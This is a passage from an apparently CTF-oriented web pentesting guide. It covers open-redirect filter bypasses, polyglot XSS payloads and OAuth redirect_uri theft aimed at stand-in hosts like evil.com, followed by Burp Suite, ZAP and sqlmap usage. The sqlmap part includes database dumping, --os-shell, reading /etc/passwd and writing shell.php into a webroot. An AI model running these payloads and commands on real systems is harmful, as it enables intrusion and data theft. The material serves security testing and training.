        "https://evil.com.",  # Trailing dot
        "https://evil.com/",
        "https://evil.com#",
        "https://evil.com?",
        "https://user@evil.com",
        "https://:pass@evil.com",
    ]
    
    print(f"[*] Testing URL normalization on {target_url}")
    
    for test_url in test_cases:
        try:
            response = requests.get(
                target_url,
                params={param: test_url},
                allow_redirects=False,
                timeout=5
            )
            
            if 'Location' in response.headers:
                location = response.headers['Location']
                print(f"\n[*] Input:  {test_url}")
                print(f"    Output: {location}")
                
                # Check if normalization changed the URL significantly
                if 'evil.com' in location:
                    print(f"    [!] Redirect maintained malicious domain")
        
        except Exception as e:
            print(f"[-] Error with {test_url}: {e}")

test_url_normalization("https://target.com/redirect")
```

### Filter Evasion Techniques

**Keyword Blacklist Bypass:**

```python
def generate_keyword_bypasses(malicious_url):
    """Generate bypasses for keyword-based filters"""
    
    bypasses = []
    
    # Case variation
    bypasses.append(malicious_url.upper())
    bypasses.append(malicious_url.lower())
    
    # Mixed case
    mixed = ""
    for i, char in enumerate(malicious_url):
        mixed += char.upper() if i % 2 == 0 else char.lower()
    bypasses.append(mixed)
    
    # Unicode variations
    # Replace characters with Unicode equivalents
    unicode_map = {
        'h': '\u0068',
        't': '\u0074',
        'p': '\u0070',
        's': '\u0073',
        ':': '\u003a',
        '/': '\u002f',
        '.': '\u002e',
    }
    
    unicode_url = ""
    for char in malicious_url:
        unicode_url += unicode_map.get(char, char)
    bypasses.append(unicode_url)
    
    # HTML entity encoding
    html_encoded = ""
    for char in malicious_url:
        html_encoded += f"&#{ord(char)};"
    bypasses.append(html_encoded)
    
    # Hex encoding
    hex_encoded = ""
    for char in malicious_url:
        hex_encoded += f"\\x{ord(char):02x}"
    bypasses.append(hex_encoded)
    
    # Remove protocol (if filter checks for http/https)
    bypasses.append(malicious_url.replace('https://', '//'))
    bypasses.append(malicious_url.replace('https://', ''))
    
    # Subdomain confusion
    bypasses.append(f"https://evil.{malicious_url}")
    
    return bypasses

malicious = "https://evil.com"
print("[*] Generated bypass payloads:")
for bypass in generate_keyword_bypasses(malicious):
    print(f"    {bypass}")
```

**Length Limitation Bypass:**

```python
def generate_short_redirects(long_url):
    """Generate shorter URLs to bypass length restrictions"""
    
    # URL shortening services
    shorteners = [
        "https://bit.ly/create",
        "https://tinyurl.com/create.php",
        "https://is.gd/create.php",
    ]
    
    # IP address instead of domain
    # evil.com = 93.184.216.34 (example)
    # Decimal: 1572395042
    # Hex: 0x5DB8D822
    
    import socket
    try:
        ip = socket.gethostbyname(long_url.replace('https://', '').split('/')[0])
        print(f"[*] IP address: {ip}")
        
        # Decimal representation
        octets = ip.split('.')
        decimal = sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(octets))
        decimal_url = f"https://{decimal}"
        print(f"[*] Decimal URL: {decimal_url}")
        
        # Hex representation
        hex_url = f"https://0x{decimal:08x}"
        print(f"[*] Hex URL: {hex_url}")
        
        # Octal representation
        octal_parts = [f"0{int(octet):o}" for octet in octets]
        octal_url = f"https://{'.'.join(octal_parts)}"
        print(f"[*] Octal URL: {octal_url}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

generate_short_redirects("https://evil.com/very/long/path/to/phishing/page")
```

## Advanced Payload Crafting

### Polyglot Redirects

**Multi-Context Payloads:**

```javascript
// Payload that works in multiple contexts
var polyglot = "https://evil.com';alert(1);//";

// In URL redirect context:
// Location: https://evil.com';alert(1);//

// In JavaScript context:
// window.location = 'https://evil.com';alert(1);//';

// In HTML context:
// <meta http-equiv="refresh" content="0;url=https://evil.com';alert(1);//">
```

**Testing Polyglot Payloads:**

```python
def generate_polyglot_redirects(base_url):
    """Generate payloads that work across multiple contexts"""
    
    polyglots = [
        # Works in both redirect and JavaScript
        f"{base_url}';alert(document.domain);//",
        
        # Works in redirect, JS, and HTML
        f"{base_url}\"><script>alert(1)</script>",
        
        # Protocol-agnostic
        f"//{base_url.replace('https://', '')}",
        
        # Works with or without quotes
        f"{base_url}%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
        
        # JavaScript and data URI combo
        f"javascript:eval('location=\"{base_url}\"')",
        
        # Meta refresh and JavaScript
        f"data:text/html,<meta http-equiv='refresh' content='0;url={base_url}'><script>alert(1)</script>",
    ]
    
    return polyglots

for payload in generate_polyglot_redirects("https://evil.com"):
    print(f"Polyglot: {payload}")
```

### Race Condition in Redirects

**Time-of-Check-Time-of-Use (TOCTOU):**

```python
import requests
import threading

def race_condition_redirect(target_url, param, valid_url, malicious_url):
    """
    Exploit race condition in redirect validation
    [Inference] Some applications validate redirect URL asynchronously
    """
    
    def send_valid():
        """Send request with valid URL"""
        requests.get(target_url, params={param: valid_url}, timeout=5)
    
    def send_malicious():
        """Send request with malicious URL immediately after"""
        requests.get(target_url, params={param: malicious_url}, timeout=5)
    
    # Send requests simultaneously
    threads = []
    for _ in range(10):
        t1 = threading.Thread(target=send_valid)
        t2 = threading.Thread(target=send_malicious)
        
        threads.extend([t1, t2])
        t1.start()
        t2.start()
    
    for t in threads:
        t.join()
    
    print("[*] Race condition test complete")

# Test race condition
race_condition_redirect(
    "https://target.com/redirect",
    "url",
    "https://trusted.com/dashboard",
    "https://evil.com/phishing"
)
```

### Redirect Chain Exploitation

**Multi-Hop Redirects:**

```bash
# Step 1: Open redirect on trusted site
https://trusted.com/redirect?url=https://partner.com/forward

# Step 2: Partner site has another open redirect
https://partner.com/forward?next=https://evil.com

# Final chain:
https://trusted.com/redirect?url=https://partner.com/forward?next=https://evil.com

# User sees trusted.com, ends up on evil.com
```

**Testing Redirect Chains:**

```python
import requests

def test_redirect_chain(initial_url, max_hops=5):
    """Follow redirect chain and identify all hops"""
    
    current_url = initial_url
    chain = []
    
    for hop in range(max_hops):
        try:
            response = requests.get(
                current_url,
                allow_redirects=False,
                timeout=5
            )
            
            chain.append({
                'hop': hop + 1,
                'url': current_url,
                'status': response.status_code,
                'location': response.headers.get('Location', 'N/A')
            })
            
            if 'Location' not in response.headers:
                break
            
            # Check for meta refresh or JavaScript redirect
            if response.status_code == 200:
                if b'http-equiv="refresh"' in response.content:
                    print(f"[*] Meta refresh at hop {hop + 1}")
                if b'window.location' in response.content:
                    print(f"[*] JavaScript redirect at hop {hop + 1}")
                break
            
            current_url = response.headers['Location']
            
            # Handle relative URLs
            if not current_url.startswith('http'):
                from urllib.parse import urljoin
                current_url = urljoin(initial_url, current_url)
        
        except Exception as e:
            print(f"[-] Error at hop {hop + 1}: {e}")
            break
    
    print(f"\n[*] Redirect chain ({len(chain)} hops):")
    for hop in chain:
        print(f"    {hop['hop']}. {hop['url']}")
        print(f"       Status: {hop['status']}, Location: {hop['location']}")
    
    return chain

# Test redirect chain
test_redirect_chain(
    "https://trusted.com/redirect?url=https://partner.com/forward?next=https://evil.com"
)
```

## Real-World Examples and Case Studies

### Example: GitHub OAuth Bypass (Historical)

```bash
# Historical vulnerability pattern (educational purposes)
# [Inference] Based on publicly disclosed security research

# Normal OAuth flow
https://github.com/login/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://trusted-app.com/callback

# Vulnerability: Insufficient redirect_uri validation
# Bypass using subdomain
https://github.com/login/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://evil.trusted-app.com/steal

# Result: Authorization code sent to attacker-controlled subdomain
```

### Example: Google OAuth redirect_uri (Historical)

```python
# Historical Google OAuth redirect_uri bypass patterns
# [Unverified] Based on bug bounty reports

def google_oauth_bypass_attempts(client_id):
    """
    Generate OAuth bypass attempts
    [Inference] These patterns were reported in historical vulnerabilities
    """
    
    legitimate = "https://trusted-app.com/oauth/callback"
    
    bypasses = [
        # Path traversal
        "https://trusted-app.com/oauth/callback/../../evil.com",
        
        # Open redirect chain
        "https://trusted-app.com/redirect?url=https://evil.com",
        
        # Subdomain wildcard abuse
        "https://attacker.trusted-app.com/steal",
        
        # Fragment manipulation
        "https://trusted-app.com/oauth/callback#@evil.com",
        
        # Host header injection
        "https://evil.com/oauth/callback",
    ]
    
    base_url = "https://accounts.google.com/o/oauth2/auth"
    
    print("[*] Testing OAuth redirect_uri bypasses:")
    for bypass in bypasses:
        params = f"?client_id={client_id}&redirect_uri={bypass}&response_type=code&scope=email"
        full_url = base_url + params
        print(f"    {full_url[:100]}...")

google_oauth_bypass_attempts("CLIENT_ID_HERE")
```

### Example: AWS Console Open Redirect

```bash
# AWS Console redirect parameter
# [Inference] Pattern analysis from security research

# Normal redirect after login
https://console.aws.amazon.com/console/home?
  region=us-east-1&
  state=hashArgs%23

# Potential bypass attempts
https://console.aws.amazon.com/console/home?
  redirect_uri=https://evil.com

https://signin.aws.amazon.com/signin?
  redirect_uri=https://attacker.com/steal
```

## Automation and Continuous Testing

### CI/CD Integration

**GitHub Actions Workflow:**

```yaml
# .github/workflows/open-redirect-scan.yml
name: Open Redirect Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 0 * * 0'  # Weekly scan

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v2
    
    - name: Setup Python
      uses: actions/setup-python@v2
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        pip install requests urllib3
    
    - name: Run open redirect scanner
      run: |
        python3 scripts/open_redirect_scanner.py \
          -u ${{ secrets.TARGET_URL }} \
          -o scan_results.txt
    
    - name: Check for vulnerabilities
      run: |
        if grep -q "VULNERABLE" scan_results.txt; then
          echo "::error::Open redirect vulnerabilities detected!"
          exit 1
        fi
    
    - name: Upload results
      uses: actions/upload-artifact@v2
      with:
        name: scan-results
        path: scan_results.txt
```

### Monitoring and Alerting

**Webhook-Based Alerting:**

```python
import requests
import json

def send_alert(vulnerability_data, webhook_url):
    """Send alert to Slack/Discord when vulnerability found"""
    
    message = {
        "text": "🚨 Open Redirect Vulnerability Detected!",
        "attachments": [{
            "color": "danger",
            "fields": [
                {
                    "title": "Parameter",
                    "value": vulnerability_data['param'],
                    "short": True
                },
                {
                    "title": "URL",
                    "value": vulnerability_data['url'],
                    "short": False
                },
                {
                    "title": "Payload",
                    "value": vulnerability_data['payload'][:100],
                    "short": False
                }
            ]
        }]
    }
    
    response = requests.post(
        webhook_url,
        data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
    
    return response.status_code == 200

# Usage in scanner
vulnerability = {
    'param': 'redirect_uri',
    'url': 'https://target.com/oauth/callback',
    'payload': 'https://evil.com'
}

send_alert(vulnerability, "https://hooks.slack.com/services/YOUR/WEBHOOK/URL")
```

## Summary and Key Takeaways

**Critical Testing Points:**

```
1. Parameter Discovery
   - Common names: url, redirect, next, return, redirect_uri
   - Hidden parameters via fuzzing
   - HTTP methods: GET, POST, both

2. Protocol Testing
   - javascript: for XSS escalation
   - data: for HTML injection
   - file:, gopher: for SSRF

3. Validation Bypass
   - Whitelist circumvention
   - Encoding variations
   - URL parsing inconsistencies
   - Regex weaknesses

4. Context Analysis
   - Location header redirects
   - Meta refresh tags
   - JavaScript-based redirects
   - OAuth/SAML flows

5. Chain Exploitation
   - XSS via redirect
   - SSRF through redirect
   - OAuth code theft
   - Session fixation
```

**Essential Tools:**

- **ffuf**: Parameter discovery and fuzzing
- **Burp Suite**: Manual testing and interception
- **curl**: Quick command-line testing
- **Custom Python scripts**: Automated scanning
- **Nuclei**: Template-based detection

**Common CTF Patterns:**

- Flags in redirect destinations
- JavaScript protocol for XSS challenges
- OAuth code theft scenarios
- SSRF via internal redirects
- Hidden parameters requiring discovery

---

**Related Topics for Further Study:**

- SSRF (Server-Side Request Forgery) exploitation techniques
- OAuth 2.0 security vulnerabilities and best practices
- URL parsing differences across languages and frameworks
- CORS (Cross-Origin Resource Sharing) misconfigurations
- CSP (Content Security Policy) bypass techniques

---

# Kali Linux Tools & Utilities

## Burp Suite (Professional & Community)

### Installation and Setup

**Kali Linux pre-installed location**:

```bash
/usr/bin/burpsuite
```

**Launch methods**:

```bash
# Community Edition
burpsuite

# Professional (if licensed)
java -jar -Xmx4g /path/to/burpsuite_pro.jar
```

**Initial configuration**:

```
1. Proxy → Options → Proxy Listeners
   - Default: 127.0.0.1:8080
   - Add: 0.0.0.0:8080 (for remote testing)
   
2. Install CA certificate:
   - Browse to http://burp (while proxy active)
   - Download cacert.der
   - Install in browser/system trust store
```

**Browser proxy configuration**:

```bash
# Firefox manual proxy
Preferences → Network Settings → Manual proxy configuration
HTTP Proxy: 127.0.0.1 Port: 8080
[x] Also use this proxy for HTTPS

# Chrome/Chromium command line
chromium --proxy-server="127.0.0.1:8080" --ignore-certificate-errors

# System-wide proxy (Linux)
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
```

### Core Features - Community Edition

**Proxy module**:

_HTTP history_:

```
Proxy → HTTP history
Filter: Show only in-scope items
Right-click → Send to Repeater/Intruder/Scanner
```

_Intercept rules_:

```
Proxy → Options → Intercept Client Requests
Add: And, URL, Is in target scope
Add: And, File extension, Does not match, ^(js|css|png|jpg|gif)$
```

_Match and Replace_:

```
Proxy → Options → Match and Replace
Type: Request header
Match: ^User-Agent.*$
Replace: User-Agent: CustomAgent/1.0
```

**Repeater module**:

Basic request manipulation:

```
1. Send request from Proxy history
2. Modify parameters/headers/body
3. Click Send
4. Analyze response
5. Compare responses (right-click → Send to Comparer)
```

**Intruder module** (rate-limited in Community):

_Attack types_:

- **Sniper**: Single payload position, iterates one parameter
- **Battering ram**: Single payload set, applied to all positions simultaneously
- **Pitchfork**: Multiple payload sets, parallel iteration
- **Cluster bomb**: Multiple payload sets, all combinations

_Payload positions_:

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§test123§
```

_Payload types_:

- Simple list
- Runtime file
- Numbers (sequential/random)
- Character substitution
- Case modification
- Recursive grep

_Example - Username enumeration_:

```
Position: username=§payload§
Payload type: Simple list
Payloads: admin, root, test, user
Grep - Extract: <div class="error">(.+?)</div>
```

**Decoder module**:

```
Decode as: URL, HTML, Base64, ASCII hex, gzip
Encode as: URL, HTML, Base64, ASCII hex
Hash: MD5, SHA-1, SHA-256
```

**Comparer module**:

```
Load two requests/responses
Words: Highlight word-level differences
Bytes: Highlight byte-level differences
Sync views: Scrolling synchronized
```

**Sequencer** (entropy analysis):

```
1. Capture token generation requests
2. Send to Sequencer
3. Configure token location
4. Start live capture (minimum 100 samples)
5. Analyze: Character-level analysis, Bit-level analysis
```

Indicates weak randomness if FIPS tests fail.

### Professional Edition Features

**Scanner**:

_Active scanning_:

```
Target → Site map → Right-click URL → Scan
Scan configuration: Crawl and Audit / Audit selected items
Audit checks: All except time-based (for speed)
```

_Passive scanning_:

```
Automatic during proxy traffic
Scanner → Scan queue → View details
Issues: Severity, Confidence, Issue type
```

_Custom insertion points_:

```
Scanner → Scan configuration → Insertion points
Add: Entire body as XML
Add: URL path filename
Add: URL path folder
```

_Scan configurations_:

```
Scanner → Scan configurations → New
Speed: Normal/Thorough
Accuracy: Normal/Minimized
```

**Extensions (BApp Store)**:

Essential extensions:

```
Extender → BApp Store

Active Scan++: Advanced injection techniques
Autorize: Authorization testing
403 Bypasser: Forbidden bypass attempts
Collaborator Everywhere: Out-of-band injection
Freddy: Java deserialization scanner
J2EEScan: Java application testing
JWT Editor: JSON Web Token manipulation
Param Miner: Parameter discovery
Retire.js: JavaScript library vulnerabilities
Turbo Intruder: High-speed attacks
Upload Scanner: File upload testing
```

**Collaborator** (Professional only):

_Out-of-band interaction testing_:

```
Burp → Project options → Misc → Burp Collaborator Server
Use: Default server / Private server

Payload insertion:
{{collaborator_payload}}
http://{{collaborator_domain}}
```

_Polling for interactions_:

```
Collaborator → Poll now
Shows: DNS lookups, HTTP requests, SMTP connections
```

**Target scope**:

```
Target → Scope → Add
Protocol: http/https
Host: target.com / *.target.com
Advanced: Regex patterns
```

**Session handling**:

```
Project options → Sessions → Session Handling Rules
Rule actions:
- Use cookies from session handling cookie jar
- Run macro
- Invoke Burp extension

Macro recording:
1. Record login sequence
2. Configure parameter extraction
3. Apply to defined scope
```

### Advanced Techniques

**Macro for authentication**:

```
1. Project options → Sessions → Macros → Add
2. Proxy → HTTP history → Select login request sequence
3. Configure parameter extraction (session token)
4. Test macro
5. Create session handling rule using macro
```

**Custom header injection**:

```
Proxy → Options → Match and Replace → Add
Type: Request header
Match: (leave empty)
Replace: X-Forwarded-For: 127.0.0.1
```

**Grep extraction for Intruder**:

```
Intruder → Options → Grep - Extract
Add → Fetch response
Highlight: Balance: $1,234.56
Extract: Balance: $(.+)$
```

**Payload processing**:

```
Intruder → Payloads → Payload Processing
Add prefix: ' OR '1'='1
Add suffix: -- -
Encode: URL-encode all characters
```

**Resource pool** (throttling):

```
Intruder → Resource pool → Create new
Maximum concurrent requests: 1
Delay between requests: 1000ms
```

### Hotkeys

```
Ctrl+Shift+I: Toggle intercept
Ctrl+R: Send to Repeater
Ctrl+I: Send to Intruder
Ctrl+Space: Send request (Repeater)
Ctrl+E: Send to Extensions
Ctrl+H: Toggle proxy history
Ctrl+T: Send to Comparer
```

### CLI and Automation

**Headless execution** (Professional):

```bash
java -jar -Xmx4g burpsuite_pro.jar --project-file=test.burp --config-file=config.json
```

**Config file example** (config.json):

```json
{
  "proxy": {
    "request_listeners": [{
      "listener_port": 8080,
      "running": true
    }]
  },
  "scanner": {
    "active_scanning_optimization": {
      "scan_speed": "thorough",
      "scan_accuracy": "normal"
    }
  }
}
```

### Community Edition Limitations

- Intruder rate-limited (slow)
- No active scanner
- No Collaborator access
- Limited to 4 concurrent Intruder threads

[Inference]: Community Edition Intruder artificially throttled to encourage Professional purchase; workarounds include Turbo Intruder extension or external tools.

## OWASP ZAP (Zed Attack Proxy)

### Installation and Launch

**Pre-installed on Kali**:

```bash
zaproxy
# Or
owasp-zap
```

**Update to latest**:

```bash
# Through package manager
apt update && apt install zaproxy

# Or download latest from GitHub
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh
chmod +x ZAP_2_14_0_unix.sh
./ZAP_2_14_0_unix.sh
```

**Headless mode**:

```bash
zap.sh -daemon -port 8080 -config api.key=changeme
```

**Docker execution**:

```bash
docker pull zaproxy/zap-stable
docker run -u zap -p 8080:8080 zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true
```

### Core Interface

**Initial setup wizard**:

```
1. Do you want to persist the ZAP session? [Yes for CTFs]
2. Default session name and location
3. [x] Remember session name
```

**HUD (Heads Up Display)**:

```
Enable: HUD → Enable HUD for desktop
Access: Browse target with proxy configured
Features: 
- In-browser attack tools
- Site tree navigation
- Alert notifications
- Break points
```

### Manual Exploration Mode

**Proxy configuration**:

```
Tools → Options → Local Proxies
Address: localhost
Port: 8080
```

**Manual explore**:

```
1. Configure browser to use ZAP proxy (localhost:8080)
2. Browse target application
3. Sites tab populates with discovered URLs
4. History tab shows all requests
```

**Scope definition**:

```
Sites → Right-click domain → Include in Context → Default Context
Sites → Right-click domain → Include in Scope
Toggle: Show only in-scope items
```

### Automated Scanning

**Spider (traditional crawler)**:

```
Tools → Spider
Start Host: http://target.com
Right-click target → Attack → Spider

Configuration:
- Maximum depth: 5
- Thread count: 5
- Parse robots.txt: false (for aggressive crawl)
- Process forms: true
```

**Ajax Spider** (JavaScript-aware):

```
Tools → Ajax Spider
Start Host: http://target.com

Settings:
- Browser: Firefox Headless
- Maximum duration: 60 minutes
- Maximum depth: 10
- Number of browser windows: 1
```

**Active Scan**:

```
Sites → Right-click target → Attack → Active Scan

Scan Policy:
- Threshold: Medium (adjust based on target)
- Strength: Medium (higher = more requests)
- Technology: Select relevant (Java, PHP, MySQL, etc.)
```

**Custom scan policy**:

```
Analyze → Scan Policy Manager → Add
Configure rules:
- SQL Injection: Enabled, Threshold: Low, Strength: High
- XSS (Reflected): Enabled, Threshold: Medium, Strength: Medium
- Path Traversal: Enabled, Threshold: Low, Strength: High
- Command Injection: Enabled, Threshold: Low, Strength: High
```

### Manual Testing Tools

**Request Editor**:

```
History → Right-click request → Open/Resend with Request Editor
- Modify method, headers, body
- Raw/Table view toggle
- Send button to execute
```

**Fuzzer**:

```
History → Right-click request → Attack → Fuzz
1. Highlight parameter value
2. Add → Payloads
3. Select payload type:
   - File (wordlist)
   - Numberzz (numeric sequences)
   - Regex
   - Scripts
4. Start Fuzzer
```

**Fuzzer payload types**:

```
File: 
- /usr/share/wordlists/dirb/common.txt
- /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt

Numberzz:
- From: 1, To: 1000, Increment: 1

Regex:
- [a-zA-Z0-9]{8} (8-char alphanumeric)
```

**Encoder/Decoder/Hash**:

```
Tools → Encode/Decode/Hash
Input: test string
Encode: Base64, URL, HTML
Decode: Base64, URL, HTML
Hash: MD5, SHA-1, SHA-256, SHA-512
```

### Advanced Features

**Forced Browse**:

```
Tools → Forced Browse Site
Select site → Start
Lists: Common directory names
Recursion: Check discovered directories
```

**Authentication**:

```
Context → Authentication → Form-Based Authentication
Login URL: http://target.com/login
Username parameter: username
Password parameter: password
Login request body: username={%username%}&password={%password%}
Logged in indicator: Welcome
Logged out indicator: Login
```

**User management**:

```
Context → Users → Add
Username: testuser
Password: testpass123
[x] Enable user
```

**Session Management**:

```
Context → Session Management
Method: Cookie-Based Session Management
Session token request header: Cookie
Session token name: PHPSESSID
```

**Script Console** (Python/JavaScript):

```
Tools → Script Console

Example - Enumerate parameters:
```

```python
def scan(sas):
    uri = sas.getBaseMsg().getRequestHeader().getURI().toString()
    params = sas.getBaseMsg().getUrlParams()
    
    for param in params:
        print(f"Testing parameter: {param.getName()}")
        
        # SQL injection test
        payload = "' OR '1'='1"
        newParam = param
        newParam.setValue(payload)
        
        msg = sas.getNewMsg()
        msg.setUrlParams([newParam])
        sas.sendAndReceive(msg)
        
        if "error" in msg.getResponseBody().toString().lower():
            print(f"Potential SQLi in {param.getName()}")
```

**Break points**:

```
Break → Add HTTP Breakpoint
URL: http://target.com/*
Method: POST
Location: Request/Response

When triggered:
- Drop: Discard request
- Step: Continue to next break
- Continue: Resume without breaking
```

### API and Automation

**REST API**:

```bash
# API key from Tools → Options → API → API Key
API_KEY="your-api-key-here"

# Spider scan
curl "http://localhost:8080/JSON/spider/action/scan/?url=http://target.com&apikey=$API_KEY"

# Active scan
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://target.com&apikey=$API_KEY"

# Get alerts
curl "http://localhost:8080/JSON/core/view/alerts/?apikey=$API_KEY" | jq .
```

**Python API client**:

```bash
pip3 install zaproxy
```

```python
from zapv2 import ZAPv2

zap = ZAPv2(apikey='your-api-key', proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})

target = 'http://target.com'

# Spider
zap.spider.scan(target)
while int(zap.spider.status()) < 100:
    print(f'Spider progress: {zap.spider.status()}%')
    time.sleep(2)

# Active scan
zap.ascan.scan(target)
while int(zap.ascan.status()) < 100:
    print(f'Scan progress: {zap.ascan.status()}%')
    time.sleep(5)

# Get results
alerts = zap.core.alerts(baseurl=target)
for alert in alerts:
    print(f"{alert['risk']}: {alert['alert']} - {alert['url']}")
```

**ZAP CLI** (deprecated, but still functional):

```bash
# Install
pip install zapcli

# Quick scan
zap-cli quick-scan -s all http://target.com

# Spider and scan
zap-cli spider http://target.com
zap-cli active-scan http://target.com
zap-cli alerts
```

### Add-ons

**Marketplace access**:

```
Manage Add-ons → Marketplace

Essential add-ons:
- Advanced SQLInjection Scanner
- Directory List v2.3 Medium
- FuzzDB Files
- FuzzDB Offensive
- Import/Export
- Token Generation and Analysis
- Wappalyzer - Technology Detection
- WebSockets
```

**Manual installation**:

```bash
# Download .zap add-on file
# Manage Add-ons → File → Load Add-on File
```

### Reporting

**Generate report**:

```
Report → Generate HTML Report
Include: All alerts / Filtered alerts
Risk level: High, Medium, Low
Confidence: High, Medium, Low
Save to: /path/to/report.html
```

**Export formats**:

- HTML (detailed)
- XML (machine-readable)
- JSON (API-friendly)
- Markdown

**Command-line report generation**:

```bash
zap-cli report -o report.html -f html
```

### ZAP vs Burp Suite

|Feature|ZAP|Burp Community|Burp Pro|
|---|---|---|---|
|Cost|Free|Free|Paid|
|Active Scanner|Yes|No|Yes|
|Intruder Speed|Normal|Throttled|Fast|
|Automation|Full API|Limited|Full|
|Extensions|Open source|Limited free|Full BApp Store|
|Learning Curve|Steeper|Moderate|Moderate|

[Inference]: Feature comparison based on standard configurations; both tools continuously evolve.

## sqlmap

### Basic Usage

**Installation verification**:

```bash
sqlmap --version
# Or update
sqlmap --update
```

**Simple GET request**:

```bash
sqlmap -u "http://target.com/page.php?id=1"
```

**POST request**:

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
```

**From Burp request file**:

```bash
# Save request in Burp: Right-click → Copy to file
sqlmap -r request.txt
```

### Detection and Injection

**Specify parameter**:

```bash
sqlmap -u "http://target.com/page.php?id=1&category=news" -p id
```

**Test all parameters**:

```bash
sqlmap -u "http://target.com/page.php?id=1&category=news" --level=5 --risk=3
```

**Level and risk parameters**:

```
--level (1-5): Tests to perform
  1: Basic GET/POST
  2-3: HTTP headers (Cookie, User-Agent)
  4-5: Extensive tests

--risk (1-3): Risk of payloads
  1: Safe for production
  2: Time-based blind, heavy queries
  3: OR-based, UPDATE queries (may alter data)
```

**Injection techniques**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

Techniques:

- **B**: Boolean-based blind
- **E**: Error-based
- **U**: UNION query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

**DBMS specification** (faster):

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL
```

Supported: MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, Access, Firebird, SAP MaxDB, Sybase, IBM DB2

### Authentication

**HTTP Basic/Digest/NTLM**:

```bash
sqlmap -u "http://target.com/admin/page.php?id=1" --auth-type=Basic --auth-cred="admin:password"
```

**Cookie-based**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123def456; security=low"
```

**Custom headers**:

```bash
sqlmap -u "http://target.com/api/user?id=1" -H "Authorization: Bearer token123" -H "X-Forwarded-For: 127.0.0.1"
```

**CSRF token handling**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --csrf-token="csrf_token" --csrf-url="http://target.com/page.php"
```

### Enumeration

**Current user and database**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --current-user --current-db
```

**Database enumeration**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

**Tables in database**:

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

**Columns in table**:

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
```

**Dump specific columns**:

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

**Dump entire database**:

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all
```

**Exclude system databases**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --exclude-sysdbs
```

**Search for columns**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --search -C password,pass,pwd
```

### Advanced Techniques

**Blind injection optimization**:

```bash
# Time-based blind (slower but stealthier)
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=10

# Boolean-based blind (faster)
sqlmap -u "http://target.com/page.php?id=1" --technique=B --string="Welcome"
```

**String matching**:

```bash
# Page contains specific string when query is true
sqlmap -u "http://target.com/page.php?id=1" --string="Success"

# Page does NOT contain string when query is true
sqlmap -u "http://target.com/page.php?id=1" --not-string="Error"
```

**UNION injection specifics**:

```bash
# Specify number of columns
sqlmap -u "http://target.com/page.php?id=1" --union-cols=5

# Test specific column for injection
sqlmap -u "http://target.com/page.php?id=1" --union-char="NULL"
```

**Second-order injection**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --second-url="http://target.com/profile.php"
```

**Tamper scripts** (WAF bypass):

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode,randomcase
```

Common tamper scripts:

```
apostrophemask.py: Replaces ' with UTF-8
base64encode.py: Base64 encodes payload
between.py: Replaces > with NOT BETWEEN
charencode.py: URL-encodes characters
charunicodeencode.py: Unicode-encodes characters
equaltolike.py: Replaces = with LIKE
space2comment.py: Replaces space with /**/
space2plus.py: Replaces space with +
space2randomblank.py: Replaces space with random blank char
```

**List tampers**:

```bash
sqlmap --list-tampers
```

### System Interaction

**OS command execution**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
```

**OS shell**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

**SQL shell**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

**File read**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
```

**File write** (requires write privileges):

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Optimization and Stealth

**Threads** (faster):

```bash
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

**Null connection** (reduced bandwidth):

```bash
sqlmap -u "http://target.com/page.php?id=1" --null-connection
```

**Delay between requests**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

**Randomize User-Agent**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --random-agent
```

**Proxy usage**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Proxy authentication
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"

# SOCKS proxy
